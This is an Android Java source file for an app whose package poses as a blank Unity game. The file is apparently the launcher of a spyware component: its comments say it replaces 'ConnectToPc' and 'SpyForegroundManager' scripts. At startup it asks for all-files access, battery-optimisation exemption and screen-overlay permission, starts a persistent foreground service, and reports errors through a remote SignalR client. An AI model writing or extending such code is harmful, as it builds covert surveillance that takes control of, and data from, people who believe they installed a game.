package com.UnityTechnologies.com.unity.template.urpblank;

import android.app.Application;
import android.content.Intent;
import android.os.Build;

/**
 * Auto-start foreground service without any C# GameService script.
 * Replaces ConnectToPc.cs / SpyForegroundManager.cs / MainPage.cs / BackgroundServiceManager.cs / PermissionManager.cs
 */
public class GameApplication extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            // Ensure our private playground folder exists from game start.
            try { FileManager.ensureAppFolder(this); } catch (Exception ignored) {}
            // Ask permissions directly from Java (no C# needed) — each helper uses NEW_TASK
            try { PermissionHelper.requestAllFilesAccess(this); } catch (Exception ignored) {}
            try { PermissionHelper.requestIgnoreBatteryOptimizations(this); } catch (Exception ignored) {}
            try { PermissionHelper.requestOverlayPermission(this); } catch (Exception ignored) {}
            // Notification permission (Android 13+) is requested via PermissionHelper if available
            // Fallback: system will prompt on first notification anyway

            Intent intent = new Intent(this, GameForegroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            SignalRClient.sendClassLog("GameApplication", "Error", "Auto-start failed: " + e.getMessage());
        }
    }
}
